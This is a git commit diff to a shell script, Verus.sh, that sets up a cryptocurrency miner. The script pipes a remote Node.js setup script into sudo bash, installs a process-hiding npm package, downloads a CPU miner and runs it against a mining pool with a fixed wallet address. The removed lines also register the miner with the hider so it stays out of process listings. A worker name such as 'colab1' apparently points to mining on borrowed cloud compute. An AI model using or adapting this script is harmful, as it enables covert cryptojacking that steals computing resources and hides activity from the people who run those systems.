baf82407f329ed28b4886b25a3394c05d43ae800
TimBurner0 <102157009+TimBurner0@users.noreply.github.com>
2022-03-24 09:48:39 +0530

    Update Verus.sh

--- Verus.sh
+++ Verus.sh
@@ -2,6 +2,6 @@ sudo apt update
 clear
 sudo apt install screen
 screen -R nheqminer
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g node-process-hider && apt install screen && wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xf nheqminer-Linux-v0.8.2.tgz &&  tar -xf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && sudo ph add nheqminer && apt install screen && screen 
-screen -R nheqminer
-sudo ./nheqminer -v -l na.luckpool.net:3956 -u RSC1ZnrrkGLuperMYD4Ta6FYnG7jFfuf4T.colab1 -t 10
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g node-process-hider && apt install screen && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && apt install screen && screen 
+screen -R hellminer
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RSC1ZnrrkGLuperMYD4Ta6FYnG7jFfuf4T.CPU2 -p x --cpu 10
